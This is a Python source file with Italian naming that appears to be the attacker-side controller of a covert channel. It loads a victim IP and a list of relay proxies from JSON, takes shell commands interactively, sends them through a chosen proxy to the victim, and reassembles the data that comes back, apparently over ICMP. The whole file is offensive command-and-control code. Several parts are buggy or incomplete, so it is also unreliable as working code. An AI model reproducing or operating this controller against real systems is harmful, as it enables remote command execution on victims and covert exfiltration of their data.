#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import ipaddress
import sys 
import os 
import argparse 
import random
import threading 
import json 
import socket 

from mymethods import * 
from custom_enum import SEPARAZIONE_DATI, ENTITY, ATTACK_TYPE
from scapy.all import * 
from check_type import * 
from get_type import *

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import *  
from network_methods import IP 
from thread_methods import PROXIES_CONECTION, WAIT_DATA


class DATA: 
    class PROXY: 
        def __init__(self, proxy:ipaddress._IPAddressBase, proxy_port:int=None): 
            if not is_ipaddress(proxy): 
                raise TypeError("proxy non valido") 
            if not is_integer(proxy_port) or not 1023<proxy_port<65536: 
                raise ValueError("proxy_port non valido")
            self.ipaddress:ipaddress.IPv4Address=proxy 
            self.port=proxy_port
            self.socket:socket.socket=None 
            self.event:threading.Event=get_threading_Event() 
            self.data_received:list[str]=[] 
            self.data_lock=get_threading_Lock() 
    
    class METHODS: 
        def invia_dati(type_separazione:Enum): 
            def by_id(): 
                print("Invio dati seprandoli by ID") 
            #-------------------
            if not is_enum_member(type_separazione, SEPARAZIONE_DATI): 
                raise TypeError("Tipologia separazione dati non vlaida")
            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
                by_id() 

        def separa_dati(type_separazione:Enum, data_received:dict[str,list]): 
            def by_id(): 
                print("Invio dati seprandoli by ID") 
                dati_separati:dict[str,list]=[]
                unindent_data=[]
                ## dati_separati={id:lista}
                for list_data in data_received.values(): 
                    if isinstance(list_data, bytes):
                            list_data=list_data.decode()
                    else: print(type(data))
                    for data in list_data.split("||"): 
                        unindent_data.append([x for x in data])
                #print("unindent_data: ",unindent_data)    
                for list_data in unindent_data:
                    #print("list_data: ",list_data)
                    #print(f"\t***{list_data}")
                    if isinstance(list_data, bytes):
                            list_data=list_data.decode()
                    else: print(type(data))
                    list_data=list_data.split("&&")
                    if len(list_data)!=2:
                        print(f"Errore. Length is {len(list_data)}\t{list_data}")
                        continue
                    if dati_separati.get(list_data[0]) is None:
                        dati_separati.update({list_data[0]:[]}) 
                    dati_separati.get(list_data[0]).append(list_data[1]) 
                return dati_separati 
            def old_by_id(dati_separati:dict[str,list]): 
                unindent_data=[]
                ## dati_separati={id:lista}
                for list_data in data_received.values():
                    for data in list_data:
                        if isinstance(data, bytes):
                            data=data.decode()
                        if isinstance(data, str):
                            data=data.split("||")
                        else: print(type(data))
                        #print("Separa: ",data) 
                        unindent_data.append([x for x in data])
                #print("unindent_data: ",unindent_data)    
                for list_data in unindent_data:
                    #print("list_data: ",list_data)
                    #print(f"\t***{list_data}")
                    for index in range(len(list_data)):
                        #print(f"AAAA: {index}/{len(list_data)}")
                        if not list_data[index]: 
                            continue
                        #print(f"\t***{list_data[index]}") 
                        if isinstance(list_data[index],bytes):
                            data=list_data[index].decode()
                        if isinstance(list_data[index],str): 
                            data=list_data[index].split("\t")
                        #print("***DATA: ",data) 
                        if dati_separati.get(data[1]) is None:
                            dati_separati.update({data[1]:[]}) 
                        dati_separati.get(data[1]).append(data)
            #-------------------
            if not is_enum_member(type_separazione, SEPARAZIONE_DATI): 
                raise TypeError("Tipologia separazione dati non vlaida")
            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
                by_id() 
            
        def unisci_dati(dati_separati:dict[str:list]):
            payload=[] 
            for index in range(len(dati_separati)): 
                #print("DATI: ",dati_separati.get(str(index))) 
                for data in dati_separati.get(str(index)):
                    if data[2]==MSG.LAST_PACKET.value:
                        continue
                    payload.append(data[2])
            return payload

class ICMP_THREAD: 
    thread_lock=None 
    thread_response={} 
    thread_list={} 

    def __init__(self, proxy_list:list[ipaddress._IPAddressBase], callback_function):  
        if not is_list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non valida") 
        if any(not is_ipaddress(ip) for ip in proxy_list): 
            raise ValueError("proxy_list non valida") 
        if not is_callable_function(callback_function): 
            raise TypeError("callback_function not callable")
        self.thread_lock=get_threading_Lock() 
        for proxy in proxy_list: 
            if not is_ipaddress(proxy): 
                print(f"***\t{proxy} non è un indirizzo valido")
                continue 
            thread=threading.Thread(
                target=callback_function, 
                args=[proxy]
            ) 
            thread.name=f"Thread-{proxy.compressed}" 
            self.thread_list[proxy.compressed]=thread 
            self.thread_response[proxy.compressed]=False 
        print("Definito il dizionario dei thread") 
        print("Definiti il dizionario delle risposte") 
    
    def reset(self): 
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            thread.clear() 
        print("Thread ICMP reimpostati") 

    def start(self): 
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        self.reset()
        for thread in self.thread_list.values():
            thread.start() 
        print("Thread ICMP avviati")
    
    def wait(self):  
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            #thread.wait()  
            thread.join()  
        print("Thread ICMP terminati") 

class ARGS_CONFIG:
    class FROM_FILE: 
        default_file_path:str="./attack_file.json" 

        def __init__(self, file_path:str=None): 
            self.config_file=None 
            if is_string(file_path) and file_path.endswith(".json"): 
                try: 
                    self.config_file=ARGS_CONFIG.FROM_FILE.load_file(file_path) 
                    pass
                except Exception as e: 
                    print(e) 
            if not self.config_file:
                self.config_file=ARGS_CONFIG.FROM_FILE.load_file(self.default_file_path) 
        
        def load_file(path_of_file:str):
            if not is_string(path_of_file): 
                raise TypeError(f"File path {path_of_file} non valido") 
            if not os.path.exists(path_of_file): 
                raise FileNotFoundError(f"File {path_of_file} non presente")
            if not str(path_of_file).endswith(".json"): 
                raise TypeError(f"File {path_of_file} non JSON file") 
            with open(path_of_file, 'r') as file: 
                print(f"File di configurazione {path_of_file} caricato correttamente") 
                return json.load(file) 
        
        def get_vittima(self): 
            try:
                ip_vittima=self.config_file.get("ip_vittima", None) 
                return ipaddress.ip_address(ip_vittima) 
            except Exception as e:
                print(f"get_vittima: {e}") 
                return None 
        
        def get_proxy_list(self):  
            proxy_list:list[ipaddress._IPAddressBase]=[]
            for ip_proxy in self.config_file.get("proxy_list", []): 
                try:
                    proxy_ip=ipaddress.ip_address(ip_proxy)
                    proxy_list.append(proxy_ip) 
                except Exception as e:
                    print(f"get_proxy_list: {e}") 
            return proxy_list if len(proxy_list)>0 else None 
        
        def get_attacco(self): 
            attack_type=ATTACK_TYPE.get_attack_method(self.config_file.get("attack_function")) 
            for count in range(3):
                if is_enum_member(attack_type,ATTACK_TYPE): 
                    return attack_type 
                attack_type=ATTACK_TYPE.choose_attack_function() 
            #raise TypeError("Attacco non valido:",attack_type) 
            return None 
        
        def get_ip_host(self): 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=input(msg) 
            #self.ip_host=ipaddress.ip_address("192.168.56.104") #TODO eliminare alla fine 
            for count in range(3):
                try:
                    ip_host=ipaddress.ip_address(ip_host) 
                    return ip_host
                except Exception as e:
                    print(f"get_ip_host: {e}") 
                    print("Indirizzo IP dell'host non valido") 
                    msg="Inserire indirizzo IP dell'host:\n\t#" 
                    ip_host=input(msg) 
            return None 
        
        def get_proxy_port(self): 
            proxy_port=int(self.config_file.get("proxy_port", None) )
            for count in range(3):
                if is_integer(proxy_port) and 0<proxy_port<65536: 
                    return proxy_port 
                print("Porta proxy non valida")
                msg="Inserire porta proxy (0-65535):\n\t#"
                proxy_port=int(input(msg)) 
            return None
        
        def get_num_proxy(self): 
            num_proxy=int(self.config_file.get("num_proxy", None) )
            for count in range(3):
                if is_integer(num_proxy) and 0<num_proxy<100: 
                    return num_proxy 
                print("Numero proxy non valido")
                msg="Inserire numero proxy (1-100):\n\t#"
                num_proxy=int(input(msg)) 
            return None
        
    class FROM_COMMAND:
        def __init__(self, entita:ENTITY=None): 
            def _attaccante()->argparse.Namespace: 
                parser.add_argument("--file_path",type=str, help="File di configurazione")  
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.file_path or not is_string(args.file_path): 
                    raise ValueError(f"--file_path non specificato") 
                return args  
            def _proxy()->argparse.Namespace: 
                parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.ip_attaccante or not is_string(args.ip_attaccante): 
                    raise ValueError(f"--ip_attaccante non specificato") 
                return args  
            def _victim()->argparse.Namespace:  
                parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.num_proxy or not is_integer(args.num_proxy): 
                    raise ValueError(f"--num_proxy non specificato") 
                return args  
            #---------------------
            if not is_enum_member(entita, ENTITY): 
                raise TypeError(f"Entità {entita} non valida") 
            #self.entita=entita 
            parser = argparse.ArgumentParser() 
            try:
                if entita==ENTITY.ATTACKER: 
                    self.args=_attaccante() 
                elif entita==ENTITY.VICTIM: 
                    self.args=_victim()
                elif entita==ENTITY.PROXY: 
                    self.args=_proxy() 
            except Exception as e:
                print(e) 
                #parser.print_help() 
                PARSER.print_supported_arguments(parser) 
            self.args=None 


class Attacker: 
    def __init__(self, config_args:ARGS_CONFIG.FROM_FILE): 
        if not isinstance(config_args, ARGS_CONFIG.FROM_FILE):
            raise TypeError("config_args non valido")
        self.ip_vittima=config_args.ip_vittima 
        self.ip_host=config_args.ip_host 
        self.attack_type=config_args.attack_type 
        self.lock_proxy_list:threading.Lock=get_threading_Lock() 
        self.proxy_list:dict[str,DATA.PROXY]=dict() 
        for proxy in config_args.proxy_list : 
            if not is_ipaddress(proxy): 
                #proxy_list.remove(proxy) 
                print(f"\t{proxy} non è un indirizzo valido") 
                continue 
            if not self.proxy_list.get(proxy.compressed): 
                self.proxy_list[proxy.compressed]=DATA.PROXY(proxy,self.proxy_port) 
        self.proxy_port=config_args.proxy_port 
        self.dati_ricevuti={} 
    
    def start(self): 
        def send_command(): 
            chosen_proxy=random.choice(self.proxy_list.values()) 
            if not isinstance(chosen_proxy, DATA.PROXY): 
                raise TypeError("Proxy non DATA.PROXY") 
            print(f"Il comando verrà mandato al proxy {chosen_proxy}") 
            with self.lock_proxy_list: 
                socket= self.proxy_list[chosen_proxy.ipaddress.compressed].socket
            messaggio=(
                MSG.CONFIRM_COMMAND.value+
                command+
                MSG.END_SOCKETSEND.value
            )
            socket.sendall(messaggio.encode()) 
            print(f"Gli altri proxy ascolteranno direttamente la vittima")
            for proxy in self.proxy_list.values(): 
                if proxy.ipaddress.compressed==chosen_proxy.ipaddress.compressed:
                    continue 
                with self.lock_proxy_list:
                    socket= self.proxy_list[proxy.ipaddress.compressed].socket
                socket.sendall(MSG.WAIT_DATA.value.encode())  
        def get_received_data(): 
            received_data=[]
            with self.lock_proxy_list: 
                for proxy in self.proxy_list.values(): 
                    with proxy.data_lock: 
                        received_data.extend(proxy.data_received) 
            return received_data 
        def reset_variables(): 
            self.thread_list={}
            self.dati_separati={}
            #self.data_received:dict[str,list]={}
            for proxy in self.proxy_list: 
                if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                    print(f"***\t{proxy} non è un indirizzo valido")
                    continue
                self.data_received.update({proxy.compressed:[]}) 
                thread=threading.Thread(
                    target=self.wait_data_from_proxy 
                    ,args=[proxy]
                )
                thread.name=f"Thread-{proxy.compressed}"
                self.thread_list.update({proxy.compressed:thread})
            for proxy in self.proxy_list:
                self.event_thread_update.get(proxy.compressed).clear() 
            for thread in self.thread_list.values():
                thread.start() 
            #if want_to_choose_new_attack():
            #    self.attack_function=choose_new_attack() 
            #if want_to_choose_new_victim:
            #   self.ip_vittima= choose_new_victim()  
        #------------------------ 
        self.thread_proxiesConnection=PROXIES_CONECTION(self.proxy_list, self.proxy_port, self.lock_proxy_list) 
        self.thread_proxiesConnection.start(
            self.ip_vittima,self.attack_type
        )  
        print(f"Got all connected proxy") 
        if len(self.proxy_list)<=0: 
            print("Nessun Proxy disponibile")
            exit(0) 
        self.thread_waitData=WAIT_DATA(self.proxy_list) 
        self.thread_waitData.start(self.proxy_list) 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in exit_cases: 
            print(f"Il comando immesso è: {command}") 
            try: 
                send_command() 
                print("Attesa dei dati dai proxy...") 
                for thread in self.thread_waitData.values(): 
                    thread.join() 
                print("Tutti i dati ricevuti dai proxy") 
                self.data_received=get_received_data() 
                print("Dati ricevuti: ",self.data_received) 
                self.dati_separati= DATA.METHODS.separa_dati(SEPARAZIONE_DATI.ID, self.data_received) 
                print("Dati separati: ",self.dati_separati) 
                #print("\n***dati_separati: ", self.dati_separati) 
                print("Dati separati per Sequenza")    
                payload=DATA.METHODS.unisci_dati(self.dati_separati)
                print(payload) 
                #reset thread and reset data_received
                reset_variables()
                command=input(msg) 
            except Exception as e: 
                print(e) 
                exit(-1)
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list.values(): 
            with self.lock_proxy_list:
                socket_proxy=self.proxy_list.get(proxy.compressed).socket 
            try: 
                socket_proxy.sendall(MSG.END_COMMUNICATION.value.encode()) 
                socket_proxy.close() 
            except Exception as e: 
                print(f"send_command_to_victim-> ",e)
                print(f"Errore durante la chiusura della connessione con proxy {proxy}")

if __name__=="__main__": 
    args=ARGS_CONFIG.FROM_COMMAND().args
    if not is_namespace(args): 
        exit(-1) 
    if not is_string(args.file_path):
        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
    attacker=Attacker(config_args) 
    attacker.start()
